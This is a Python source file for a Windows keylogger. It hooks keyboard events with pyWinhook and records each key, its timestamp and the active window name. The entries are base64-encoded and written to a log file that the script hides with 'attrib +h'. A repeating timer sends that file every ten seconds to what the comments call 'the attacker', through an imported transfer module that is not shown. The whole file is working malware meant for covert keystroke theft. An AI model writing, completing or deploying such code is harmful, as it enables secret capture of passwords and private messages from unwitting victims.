import pyWinhook, pythoncom, os
import threading
from src import base64cipher
from src import newServer

# Variables for the process
filepath = "log.txt"


# Turn file to hidden
def hide():
    if os.path.exists(filepath):
        p = os.popen('attrib +h ' + filepath)
        p.close()
    else:
        file = open(filepath, "w+", encoding='utf-8')
        file.close()
        p = os.popen('attrib +h ' + filepath)
        t = p.read()
        p.close()


# Open connection to the attacker
def opensocket():
    openTunnel = newServer.transfer(filepath)
    return openTunnel


# Format the log file sent to the attacker
def onKeyDown(e):
    s = "{} \t {} \t {} \n".format(e.GetKey(), e.Time, e.WindowName)
    # c.send(s.encode())
    writeToFile(s)
    return 1


# Write the keys detected to the log file and encode
def writeToFile(s):
    file = open(filepath, "a", encoding='utf-8')
    msg = encodeTXT(s)
    file.write(msg)


# Encode using base64 cipher
def encodeTXT(s):
    return base64cipher.encodeMsg(s)


# start the keylogger hack process
def start():
    hide()
    ot = opensocket()
    send(ot)
    hm = pyWinhook.HookManager()
    hm.HookKeyboard()
    hm.SubscribeKeyDown(onKeyDown)
    pythoncom.PumpMessages()


def send(ot):
    # wait 10 sec and send the log
    threading.Timer(interval=10, function=send, args=(ot,)).start()
    ot.send_file()


# Start tunnel
start()
k = input('press enter to exit...')
